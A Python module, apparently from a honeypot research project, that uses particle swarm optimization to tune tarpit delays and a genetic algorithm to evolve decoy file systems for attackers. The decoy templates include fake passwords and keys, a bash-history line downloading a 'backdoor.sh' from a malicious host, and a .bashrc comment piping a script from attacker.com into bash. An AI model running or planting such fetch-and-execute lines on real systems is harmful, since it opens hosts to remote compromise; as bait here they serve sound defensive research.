"""
Chameleon Meta-Heuristic Optimization Engine
============================================
Implements two bio-inspired optimization algorithms for adaptive honeypot deception:

1. Particle Swarm Optimization (PSO) - For adaptive tarpitting delay adjustment
2. Genetic Algorithm (GA) - For dynamic deception schema evolution

Author: Chameleon Research Team
Date: March 2026
"""

import asyncio
import random
import math
import hashlib
import logging
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum

logger = logging.getLogger(__name__)


# ============================================================================
# Configuration Constants
# ============================================================================

class AttackCategory(str, Enum):
    """Supported attack categories for optimization."""
    SQLI = "SQLI"
    XSS = "XSS"
    SSI = "SSI"
    BRUTE_FORCE = "BRUTE_FORCE"
    RCE = "RCE"
    PATH_TRAVERSAL = "PATH_TRAVERSAL"
    GENERIC = "GENERIC"


# PSO Hyperparameters
PSO_CONFIG = {
    "num_particles": 15,
    "max_iterations": 50,
    "inertia_weight": 0.729,      # w: Controls momentum
    "cognitive_coefficient": 1.49445,  # c1: Self-confidence
    "social_coefficient": 1.49445,     # c2: Swarm confidence
    "min_delay": 0.5,             # Minimum tarpit delay (seconds)
    "max_delay": 12.0,            # Maximum tarpit delay (seconds)
    "fitness_decay": 0.95,        # Fitness memory decay factor
}

# GA Hyperparameters
GA_CONFIG = {
    "population_size": 20,
    "num_generations": 30,
    "crossover_rate": 0.85,
    "mutation_rate": 0.15,
    "elitism_count": 3,           # Top individuals to preserve
    "schema_complexity_weight": 0.3,
}

# Fitness function weights
FITNESS_WEIGHTS = {
    "w1_command_execution": 0.65,  # Weight for attacker engagement
    "w2_drop_penalty": 2.5,        # Penalty multiplier for disconnection
    "w3_interaction_bonus": 0.25,  # Bonus for file/path interactions
}


# ============================================================================
# Particle Swarm Optimization for Adaptive Tarpitting
# ============================================================================

@dataclass
class Particle:
    """Represents a single particle in the PSO swarm."""
    position: float  # Current delay value
    velocity: float  # Current velocity
    best_position: float  # Personal best position
    best_fitness: float = float('-inf')  # Personal best fitness
    fitness_history: List[float] = field(default_factory=list)


class AdaptiveTarpitPSO:
    """
    Particle Swarm Optimization for Adaptive Tarpit Delay Tuning.
    
    This class implements PSO to dynamically optimize the asyncio.sleep() delay
    in the deception layer. The goal is to maximize attacker dwell time while
    avoiding connection timeouts that would reveal the honeypot.
    
    Fitness Function:
    ─────────────────
    F(t) = (w₁ · C_exec) - (w₂ · P_drop)
    
    Where:
        - C_exec: Number of commands executed by attacker (engagement metric)
        - P_drop: Binary penalty (1 if attacker disconnected, 0 otherwise)
        - w₁ = 0.65 (weight for command execution)
        - w₂ = 2.5 (heavy penalty for disconnection)
    
    The fitness is evaluated after each attacker session and used to update
    particle positions for future optimization.
    
    Attributes:
        particles (Dict[str, List[Particle]]): Swarm particles per attack category
        global_best (Dict[str, Tuple[float, float]]): Global best position & fitness
        session_tracker (Dict): Tracks active sessions and their metrics
    """
    
    def __init__(self):
        self.particles: Dict[str, List[Particle]] = {}
        self.global_best: Dict[str, Tuple[float, float]] = {}  # (position, fitness)
        self.session_tracker: Dict[str, Dict] = {}
        self.iteration_count: Dict[str, int] = {}
        
        # Initialize particles for each attack category
        for category in AttackCategory:
            self._initialize_swarm(category.value)
    
    def _initialize_swarm(self, category: str):
        """Initialize PSO swarm for a specific attack category."""
        self.particles[category] = []
        self.iteration_count[category] = 0
        
        # Initialize global best with default moderate delay
        self.global_best[category] = (3.0, float('-inf'))
        
        for _ in range(PSO_CONFIG["num_particles"]):
            # Random initial position within bounds
            position = random.uniform(
                PSO_CONFIG["min_delay"],
                PSO_CONFIG["max_delay"]
            )
            # Random initial velocity (bounded)
            max_velocity = (PSO_CONFIG["max_delay"] - PSO_CONFIG["min_delay"]) * 0.3
            velocity = random.uniform(-max_velocity, max_velocity)
            
            particle = Particle(
                position=position,
                velocity=velocity,
                best_position=position,
                best_fitness=float('-inf')
            )
            self.particles[category].append(particle)
    
    async def get_optimal_delay(self, attack_category: str) -> float:
        """
        Retrieve the optimal tarpit delay for a given attack category.
        
        Uses the global best position from the PSO swarm. If the category
        is unknown, returns a safe default delay.
        
        Args:
            attack_category: The type of attack detected (e.g., 'SQLI', 'XSS')
        
        Returns:
            float: Optimal delay in seconds (bounded by min/max config)
        """
        category = attack_category.upper()
        
        if category not in self.global_best:
            # Fallback for unknown categories
            return 2.5
        
        optimal_delay = self.global_best[category][0]
        
        # Ensure delay stays within bounds
        return max(
            PSO_CONFIG["min_delay"],
            min(optimal_delay, PSO_CONFIG["max_delay"])
        )
    
    async def update_fitness(
        self,
        attack_category: str,
        delay_used: float,
        commands_executed: int,
        dropped: bool,
        session_id: str = None
    ):
        """
        Update particle fitness based on attacker session outcome.
        
        This method evaluates the fitness function F(t) and updates both
        personal best (p_best) and global best (g_best) positions for all
        particles in the swarm.
        
        Args:
            attack_category: Type of attack (e.g., 'SQLI', 'BRUTE_FORCE')
            delay_used: The delay that was applied during the session
            commands_executed: Number of commands the attacker executed
            dropped: True if attacker disconnected, False otherwise
            session_id: Optional session identifier for tracking
        """
        category = attack_category.upper()
        
        if category not in self.particles:
            self._initialize_swarm(category)
        
        # Calculate fitness using the defined formula
        # F(t) = (w1 * C_exec) - (w2 * P_drop)
        w1 = FITNESS_WEIGHTS["w1_command_execution"]
        w2 = FITNESS_WEIGHTS["w2_drop_penalty"]
        
        c_exec = commands_executed
        p_drop = 1.0 if dropped else 0.0
        
        fitness = (w1 * c_exec) - (w2 * p_drop)
        
        # Add interaction bonus for sustained engagement
        if commands_executed > 5:
            fitness += FITNESS_WEIGHTS["w3_interaction_bonus"] * (commands_executed - 5)
        
        logger.info(
            f"PSO Fitness Update | Category: {category} | "
            f"Delay: {delay_used:.2f}s | Commands: {c_exec} | "
            f"Dropped: {dropped} | Fitness: {fitness:.4f}"
        )
        
        # Update particles
        particles = self.particles[category]
        
        for particle in particles:
            # Find particle closest to the delay_used
            distance = abs(particle.position - delay_used)
            
            if distance < 1.5:  # Update particles near the used delay
                particle.fitness_history.append(fitness)
                
                # Apply fitness decay for historical memory
                if len(particle.fitness_history) > 5:
                    particle.fitness_history.pop(0)
                
                avg_fitness = sum(particle.fitness_history) / len(particle.fitness_history)
                
                # Update personal best
                if avg_fitness > particle.best_fitness:
                    particle.best_fitness = avg_fitness
                    particle.best_position = particle.position
                
                # Update global best
                if avg_fitness > self.global_best[category][1]:
                    self.global_best[category] = (particle.position, avg_fitness)
                    logger.info(
                        f"🎯 PSO New Global Best | {category}: "
                        f"Delay={particle.position:.2f}s, Fitness={avg_fitness:.4f}"
                    )
        
        # Update velocity and position for all particles
        self._update_swarm(category)
        self.iteration_count[category] += 1
    
    def _update_swarm(self, category: str):
        """Update velocity and position for all particles in the swarm."""
        w = PSO_CONFIG["inertia_weight"]
        c1 = PSO_CONFIG["cognitive_coefficient"]
        c2 = PSO_CONFIG["social_coefficient"]
        
        g_best_pos = self.global_best[category][0]
        
        for particle in self.particles[category]:
            # Generate random coefficients
            r1 = random.random()
            r2 = random.random()
            
            # Update velocity using PSO formula:
            # v(t+1) = w·v(t) + c1·r1·(p_best - x(t)) + c2·r2·(g_best - x(t))
            cognitive = c1 * r1 * (particle.best_position - particle.position)
            social = c2 * r2 * (g_best_pos - particle.position)
            
            particle.velocity = w * particle.velocity + cognitive + social
            
            # Clamp velocity
            max_v = (PSO_CONFIG["max_delay"] - PSO_CONFIG["min_delay"]) * 0.3
            particle.velocity = max(-max_v, min(max_v, particle.velocity))
            
            # Update position
            particle.position += particle.velocity
            
            # Clamp position to bounds
            particle.position = max(
                PSO_CONFIG["min_delay"],
                min(particle.position, PSO_CONFIG["max_delay"])
            )
    
    def get_swarm_statistics(self, category: str) -> Dict:
        """Get statistical summary of the swarm for a category."""
        if category not in self.particles:
            return {}
        
        particles = self.particles[category]
        positions = [p.position for p in particles]
        fitnesses = [p.best_fitness for p in particles if p.best_fitness > float('-inf')]
        
        return {
            "category": category,
            "iterations": self.iteration_count.get(category, 0),
            "global_best_delay": self.global_best.get(category, (0, 0))[0],
            "global_best_fitness": self.global_best.get(category, (0, 0))[1],
            "mean_position": sum(positions) / len(positions) if positions else 0,
            "std_position": math.sqrt(sum((x - sum(positions)/len(positions))**2 for x in positions) / len(positions)) if len(positions) > 1 else 0,
            "mean_fitness": sum(fitnesses) / len(fitnesses) if fitnesses else 0,
            "num_particles": len(particles),
        }


# ============================================================================
# Genetic Algorithm for Dynamic Deception Schema Evolution
# ============================================================================

@dataclass
class Chromosome:
    """Represents a deception schema chromosome."""
    schema_id: str
    fake_structure: Dict[str, str]  # {path: content}
    fitness: float = 0.0
    age: int = 0  # Generations survived
    interaction_count: int = 0


class DeceptionEvolutionGA:
    """
    Genetic Algorithm for Dynamic Deception Schema Evolution.
    
    This class evolves fake file systems, database schemas, and mock responses
    to maximize attacker engagement. The GA learns which deceptive structures
    are most effective at eliciting attacker interaction.
    
    Chromosome Representation:
    ──────────────────────────
    Each chromosome encodes a fake directory structure or database schema:
    {
        "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\\n...",
        "/var/www/html/config.bak": "<?php\\n$db_password = 'admin123';\\n...",
        "/home/admin/.ssh/id_rsa": "-----BEGIN RSA PRIVATE KEY-----\\n...",
        "/tmp/backup.zip": "[BINARY DATA]",
    }
    
    Fitness Evaluation:
    ───────────────────
    F(s) = Σ(interaction_bonus_i) + complexity_bonus - staleness_penalty
    
    Where:
        - interaction_bonus: Reward for each file path the attacker accesses
        - complexity_bonus: Bonus for realistic schema complexity
        - staleness_penalty: Penalty for schemas that survive too long
    
    Genetic Operators:
    ──────────────────
    - Selection: Tournament selection (k=3)
    - Crossover: Uniform crossover with path-level merging
    - Mutation: Random file addition/deletion/modification
    
    Attributes:
        population (Dict[str, Chromosome]): Current population of schemas
        generation (int): Current generation number
        interaction_history (Dict): Tracks which paths were accessed
    """
    
    def __init__(self):
        self.population: Dict[str, Chromosome] = {}
        self.generation: int = 0
        self.interaction_history: Dict[str, List[str]] = {}  # schema_id -> [interacted_paths]
        self.best_schema: Optional[Chromosome] = None
        self.best_fitness: float = float('-inf')
        
        # Initialize population with diverse schemas
        self._initialize_population()
    
    def _initialize_population(self):
        """Initialize GA population with diverse deception schemas."""
        schema_templates = self._get_schema_templates()
        
        for i in range(GA_CONFIG["population_size"]):
            schema_id = f"schema_{self.generation:03d}_{i:02d}"
            
            # Create varied schema from templates
            fake_structure = self._create_variant_schema(schema_templates, i)
            
            chromosome = Chromosome(
                schema_id=schema_id,
                fake_structure=fake_structure,
                fitness=0.0,
                age=0,
                interaction_count=0
            )
            
            self.population[schema_id] = chromosome
            self.interaction_history[schema_id] = []
    
    def _get_schema_templates(self) -> Dict[str, Dict[str, str]]:
        """Return base deception schema templates."""
        return {
            "linux_system": {
                "/etc/passwd": (
                    "root:x:0:0:root:/root:/bin/bash\n"
                    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
                    "admin:x:1000:1000:Administrator:/home/admin:/bin/bash"
                ),
                "/etc/shadow": "root:$6$rounds=4096$randomsalt$hashedpassword:19000:0:99999:7:::",
                "/etc/hosts": "127.0.0.1\tlocalhost\n192.168.1.100\tdb-server.internal",
                "/var/log/auth.log": (
                    "Mar 10 08:23:15 server sshd[1234]: Accepted publickey for admin\n"
                    "Mar 10 09:45:32 server sudo: admin : TTY=pts/0 ; PWD=/home/admin"
                ),
            },
            "web_application": {
                "/var/www/html/config.php": (
                    "<?php\n"
                    "$db_host = 'localhost';\n"
                    "$db_user = 'webapp';\n"
                    "$db_pass = 'S3cr3t_P@ssw0rd!';\n"
                    "$db_name = 'production_db';\n"
                    "?>"
                ),
                "/var/www/html/.env": (
                    "DATABASE_URL=postgresql://admin:password123@localhost:5432/app\n"
                    "SECRET_KEY=sk_live_REDACTED_PLACEHOLDER_KEY\n"
                    "AWS_ACCESS_KEY_ID=AKIAREDACTEDPLACEHOLDER\n"
                    "AWS_SECRET_ACCESS_KEY=REDACTED_PLACEHOLDER_SECRET_KEY"
                ),
                "/var/www/html/backup.sql": (
                    "-- MySQL dump 10.13\n"
                    "-- Database: production_db\n"
                    "CREATE TABLE users (id INT, username VARCHAR(50), password_hash VARCHAR(255));\n"
                    "INSERT INTO users VALUES (1, 'admin', '$2y$10$hashedpassword...');"
                ),
            },
            "developer_workspace": {
                "/home/dev/.ssh/id_rsa": (
                    "-----BEGIN RSA PRIVATE KEY-----\n"
                    "MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy...\n"
                    "-----END RSA PRIVATE KEY-----"
                ),
                "/home/dev/.bash_history": (
                    "cd /var/www\n"
                    "cat config.php\n"
                    "mysql -u root -p\n"
                    "wget http://malicious-site.com/backdoor.sh"
                ),
                "/tmp/api_keys.json": (
                    '{\n'
                    '  "github_token": "ghp_REDACTED_PLACEHOLDER_TOKEN",\n'
                    '  "slack_webhook": "https://hooks.slack.com/services/REDACTED",\n'
                    '  "stripe_key": "sk_live_REDACTED_PLACEHOLDER"\n'
                    '}'
                ),
            },
            "database_admin": {
                "/var/lib/mysql/auto.cnf": (
                    "[auto]\n"
                    "server-uuid=12345678-1234-1234-1234-123456789abc\n"
                    "root_password=TempPass123!"
                ),
                "/root/.my.cnf": (
                    "[client]\n"
                    "user=root\n"
                    "password=RootP@ssw0rd2024\n"
                    "host=localhost"
                ),
                "/tmp/db_dump.sql": (
                    "-- Database backup created: 2024-03-10\n"
                    "CREATE DATABASE sensitive_data;\n"
                    "USE sensitive_data;\n"
                    "CREATE TABLE credentials (user VARCHAR(50), pass VARCHAR(255));"
                ),
            }
        }
    
    def _create_variant_schema(
        self,
        templates: Dict[str, Dict[str, str]],
        variant_index: int
    ) -> Dict[str, str]:
        """Create a variant schema by mixing and modifying templates."""
        template_keys = list(templates.keys())
        
        # Select 1-2 template types to combine
        num_templates = random.randint(1, min(2, len(template_keys)))
        selected_templates = random.sample(template_keys, num_templates)
        
        schema = {}
        
        for template_name in selected_templates:
            template = templates[template_name]
            
            # Include 60-100% of paths from template
            paths = list(template.keys())
            num_paths = max(1, int(len(paths) * random.uniform(0.6, 1.0)))
            selected_paths = random.sample(paths, num_paths)
            
            for path in selected_paths:
                content = template[path]
                
                # Apply mutation with 30% probability
                if random.random() < 0.3:
                    content = self._mutate_content(content, variant_index)
                
                # Add path variation
                if random.random() < 0.2:
                    path = self._mutate_path(path, variant_index)
                
                schema[path] = content
        
        # Add some random tempting files
        if random.random() < 0.5:
            schema.update(self._generate_tempting_files(variant_index))
        
        return schema
    
    def _mutate_content(self, content: str, variant_index: int) -> str:
        """Apply content mutation to make schema more diverse."""
        mutations = [
            lambda c: c + f"\n# Variant {variant_index}",
            lambda c: c.replace("password", "pass"),
            lambda c: c.replace("admin", f"admin{variant_index % 10}"),
            lambda c: c + "\n# Last modified: " + datetime.now().strftime("%Y-%m-%d"),
            lambda c: "# CONFIDENTIAL - DO NOT SHARE\n" + c,
        ]
        
        mutation = random.choice(mutations)
        return mutation(content)
    
    def _mutate_path(self, path: str, variant_index: int) -> str:
        """Apply path mutation for diversity."""
        mutations = [
            lambda p: p.replace(".bak", f".bak.{variant_index}"),
            lambda p: p.replace("/tmp/", "/var/tmp/"),
            lambda p: p.replace("config", f"config_{variant_index % 5}"),
            lambda p: p + ".old",
        ]
        
        mutation = random.choice(mutations)
        return mutation(path)
    
    def _generate_tempting_files(self, variant_index: int) -> Dict[str, str]:
        """Generate additional tempting fake files."""
        tempting_files = {
            f"/tmp/backup_{variant_index}.zip": "[ENCRYPTED BACKUP DATA - 2.4 MB]",
            "/home/admin/.aws/credentials": (
                "[default]\n"
                "aws_access_key_id = AKIAREDACTEDPLACEHOLDER\n"
                "aws_secret_access_key = REDACTED_PLACEHOLDER_SECRET_KEY"
            ),
            "/var/www/html/wp-config.php.bak": (
                "<?php\n"
                "define('DB_NAME', 'wordpress');\n"
                "define('DB_USER', 'wp_admin');\n"
                "define('DB_PASSWORD', 'Wp@dm1n2024!');\n"
                "?>"
            ),
            "/etc/mysql/debian.cnf": (
                "[client]\n"
                "user=debian-sys-maint\n"
                "password=SysMaint123!\n"
                "socket=/var/run/mysqld/mysqld.sock"
            ),
            "/root/.bashrc": (
                "alias ll='ls -la'\n"
                "export PATH=$PATH:/opt/custom\n"
                "# Hidden: curl http://attacker.com/shell.sh | bash"
            ),
        }
        
        # Select 1-3 random tempting files
        num_files = random.randint(1, min(3, len(tempting_files)))
        selected = random.sample(list(tempting_files.items()), num_files)
        
        return dict(selected)
    
    async def get_tempting_schema(self) -> Tuple[str, Dict[str, str]]:
        """
        Retrieve the most tempting schema from the current population.
        
        Uses fitness-proportional selection to choose a schema. Higher fitness
        schemas have greater probability of being selected.
        
        Returns:
            Tuple[str, Dict[str, str]]: (schema_id, fake_structure)
        """
        if not self.population:
            self._initialize_population()
        
        # Fitness-proportional selection (roulette wheel)
        fitnesses = [
            max(c.fitness, 0.1) for c in self.population.values()
        ]
        total_fitness = sum(fitnesses)
        
        if total_fitness == 0:
            # Fallback to random selection
            schema_id = random.choice(list(self.population.keys()))
        else:
            # Roulette wheel selection
            selection_point = random.uniform(0, total_fitness)
            cumulative = 0
            
            schema_id = list(self.population.keys())[0]
            for sid, chromosome in self.population.items():
                cumulative += chromosome.fitness if chromosome.fitness > 0 else 0.1
                if cumulative >= selection_point:
                    schema_id = sid
                    break
        
        schema = self.population[schema_id]
        schema.interaction_count += 1
        
        logger.debug(f"GA Selected schema: {schema_id} (fitness={schema.fitness:.2f})")
        
        return schema_id, schema.fake_structure
    
    async def evaluate_interaction(
        self,
        schema_id: str,
        interacted_paths: List[str]
    ) -> float:
        """
        Evaluate and update fitness based on attacker interactions.
        
        Fitness Function:
        ─────────────────
        F(s) = Σ(interaction_bonus_i) + complexity_bonus - staleness_penalty
        
        Args:
            schema_id: ID of the schema that was presented
            interacted_paths: List of file paths the attacker accessed
        
        Returns:
            float: Updated fitness score
        """
        if schema_id not in self.population:
            logger.warning(f"GA: Unknown schema_id {schema_id}")
            return 0.0
        
        chromosome = self.population[schema_id]
        
        # Track interactions
        self.interaction_history[schema_id].extend(interacted_paths)
        
        # Calculate interaction bonus
        # Reward: More unique paths accessed = better deception
        unique_paths = set(interacted_paths)
        interaction_bonus = len(unique_paths) * FITNESS_WEIGHTS["w3_interaction_bonus"] * 10
        
        # Bonus for accessing "sensitive" files
        sensitive_keywords = ['password', 'secret', 'key', 'credential', 'backup', '.env', 'id_rsa']
        for path in unique_paths:
            if any(keyword in path.lower() for keyword in sensitive_keywords):
                interaction_bonus += 2.0  # Extra bonus for sensitive files
        
        # Complexity bonus: Reward schemas with realistic structure
        complexity_bonus = len(chromosome.fake_structure) * GA_CONFIG["schema_complexity_weight"]
        
        # Staleness penalty: Older schemas get penalty to encourage diversity
        staleness_penalty = chromosome.age * 0.1
        
        # Calculate total fitness
        fitness_delta = interaction_bonus + complexity_bonus - staleness_penalty
        chromosome.fitness += fitness_delta
        chromosome.age += 1
        
        logger.info(
            f"GA Fitness Update | Schema: {schema_id} | "
            f"Interactions: {len(interacted_paths)} | "
            f"Fitness Delta: {fitness_delta:.2f} | "
            f"Total Fitness: {chromosome.fitness:.2f}"
        )
        
        # Update global best
        if chromosome.fitness > self.best_fitness:
            self.best_fitness = chromosome.fitness
            self.best_schema = chromosome
            
            logger.info(
                f"🧬 GA New Best Schema | ID: {schema_id} | "
                f"Fitness: {chromosome.fitness:.2f} | "
                f"Paths: {len(chromosome.fake_structure)}"
            )
        
        return chromosome.fitness
    
    async def evolve_population(self):
        """
        Execute one generation of the genetic algorithm.
        
        Performs:
        1. Selection: Tournament selection (k=3)
        2. Crossover: Uniform crossover with path-level merging
        3. Mutation: Random file addition/deletion/modification
        4. Elitism: Preserve top performers
        """
        if len(self.population) < GA_CONFIG["population_size"]:
            return  # Need minimum population
        
        self.generation += 1
        
        # Sort by fitness (descending)
        sorted_population = sorted(
            self.population.values(),
            key=lambda c: c.fitness,
            reverse=True
        )
        
        # Elitism: Preserve top individuals
        new_population = {}
        for i in range(GA_CONFIG["elitism_count"]):
            elite = sorted_population[i]
            new_population[elite.schema_id] = elite
            logger.debug(f"GA Elitism: Preserved {elite.schema_id} (fitness={elite.fitness:.2f})")
        
        # Generate offspring
        while len(new_population) < GA_CONFIG["population_size"]:
            # Tournament selection
            parent1 = self._tournament_selection(sorted_population)
            parent2 = self._tournament_selection(sorted_population)
            
            # Crossover
            if random.random() < GA_CONFIG["crossover_rate"]:
                child_schema = self._crossover(parent1, parent2)
            else:
                child_schema = parent1.fake_structure.copy()
            
            # Mutation
            if random.random() < GA_CONFIG["mutation_rate"]:
                child_schema = self._mutate_schema(child_schema)
            
            # Create child chromosome
            schema_id = f"schema_{self.generation:03d}_{len(new_population):02d}"
            child = Chromosome(
                schema_id=schema_id,
                fake_structure=child_schema,
                fitness=0.0,
                age=0,
                interaction_count=0
            )
            
            new_population[schema_id] = child
            self.interaction_history[schema_id] = []
        
        # Replace population
        self.population = new_population
        
        # Age all chromosomes
        for chromosome in self.population.values():
            chromosome.age += 1
        
        logger.info(
            f"🧬 GA Generation {self.generation} Complete | "
            f"Best Fitness: {self.best_fitness:.2f} | "
            f"Population Size: {len(self.population)}"
        )
    
    def _tournament_selection(self, population: List[Chromosome], k: int = 3) -> Chromosome:
        """Select individual using tournament selection."""
        tournament = random.sample(population, min(k, len(population)))
        return max(tournament, key=lambda c: c.fitness)
    
    def _crossover(
        self,
        parent1: Chromosome,
        parent2: Chromosome
    ) -> Dict[str, str]:
        """
        Perform uniform crossover between two parent schemas.
        
        Merges paths from both parents, preferring higher-fitness parent's
        content when conflicts occur.
        """
        child_schema = {}
        
        # Get all unique paths from both parents
        all_paths = set(parent1.fake_structure.keys()) | set(parent2.fake_structure.keys())
        
        # Determine which parent is fitter
        fitter_parent = parent1 if parent1.fitness > parent2.fitness else parent2
        
        for path in all_paths:
            if path in parent1.fake_structure and path in parent2.fake_structure:
                # Both have this path: 70% from fitter parent
                if random.random() < 0.7:
                    child_schema[path] = fitter_parent.fake_structure[path]
                else:
                    other = parent2 if fitter_parent == parent1 else parent1
                    child_schema[path] = other.fake_structure[path]
            elif path in parent1.fake_structure:
                child_schema[path] = parent1.fake_structure[path]
            else:
                child_schema[path] = parent2.fake_structure[path]
        
        return child_schema
    
    def _mutate_schema(self, schema: Dict[str, str]) -> Dict[str, str]:
        """Apply mutation to a schema."""
        mutated = schema.copy()
        
        mutation_type = random.choice(['add', 'delete', 'modify'])
        
        if mutation_type == 'add' or len(mutated) < 3:
            # Add new tempting file
            new_files = self._generate_tempting_files(random.randint(0, 100))
            if new_files:
                path, content = list(new_files.items())[0]
                mutated[path] = content
        
        elif mutation_type == 'delete' and len(mutated) > 3:
            # Remove a random file
            path_to_remove = random.choice(list(mutated.keys()))
            del mutated[path_to_remove]
        
        elif mutation_type == 'modify':
            # Modify existing content
            if mutated:
                path_to_modify = random.choice(list(mutated.keys()))
                content = mutated[path_to_modify]
                
                # Apply random modification
                modifications = [
                    lambda c: c + "\n# Modified by GA",
                    lambda c: c.replace("2024", "2025"),
                    lambda c: c + f"\n# Access count: {random.randint(1, 100)}",
                ]
                
                modification = random.choice(modifications)
                mutated[path_to_modify] = modification(content)
        
        return mutated
    
    def get_population_statistics(self) -> Dict:
        """Get statistical summary of the current population."""
        if not self.population:
            return {}
        
        fitnesses = [c.fitness for c in self.population.values()]
        ages = [c.age for c in self.population.values()]
        
        return {
            "generation": self.generation,
            "population_size": len(self.population),
            "best_fitness": max(fitnesses),
            "mean_fitness": sum(fitnesses) / len(fitnesses),
            "std_fitness": math.sqrt(sum((x - sum(fitnesses)/len(fitnesses))**2 for x in fitnesses) / len(fitnesses)) if len(fitnesses) > 1 else 0,
            "mean_age": sum(ages) / len(ages),
            "best_schema_id": self.best_schema.schema_id if self.best_schema else None,
        }


# ============================================================================
# Global Instances for Pipeline Integration
# ============================================================================

# Singleton instances (import these in pipeline.py)
pso_optimizer = AdaptiveTarpitPSO()
ga_optimizer = DeceptionEvolutionGA()


# ============================================================================
# Utility Functions for Session Tracking
# ============================================================================

@dataclass
class AttackerSession:
    """Tracks an attacker's session for fitness evaluation."""
    session_id: str
    attack_category: str
    delay_used: float
    commands_executed: int = 0
    interacted_paths: List[str] = field(default_factory=list)
    start_time: datetime = field(default_factory=datetime.now)
    ended: bool = False


class SessionTracker:
    """
    Tracks attacker sessions for meta-heuristic fitness evaluation.
    
    Maintains state between the initial deception and session termination,
    enabling accurate fitness calculation for both PSO and GA.
    """
    
    def __init__(self):
        self.sessions: Dict[str, AttackerSession] = {}
    
    def create_session(
        self,
        session_id: str,
        attack_category: str,
        delay_used: float
    ) -> AttackerSession:
        """Create a new attacker session tracker."""
        session = AttackerSession(
            session_id=session_id,
            attack_category=attack_category,
            delay_used=delay_used
        )
        self.sessions[session_id] = session
        return session
    
    def record_command(self, session_id: str):
        """Record a command execution in the session."""
        if session_id in self.sessions:
            self.sessions[session_id].commands_executed += 1
    
    def record_path_interaction(self, session_id: str, path: str):
        """Record a file/path interaction in the session."""
        if session_id in self.sessions:
            self.sessions[session_id].interacted_paths.append(path)
    
    def end_session(self, session_id: str) -> Optional[AttackerSession]:
        """Mark session as ended and return it for fitness evaluation."""
        if session_id in self.sessions:
            self.sessions[session_id].ended = True
            return self.sessions[session_id]
        return None


# Global session tracker
session_tracker = SessionTracker()
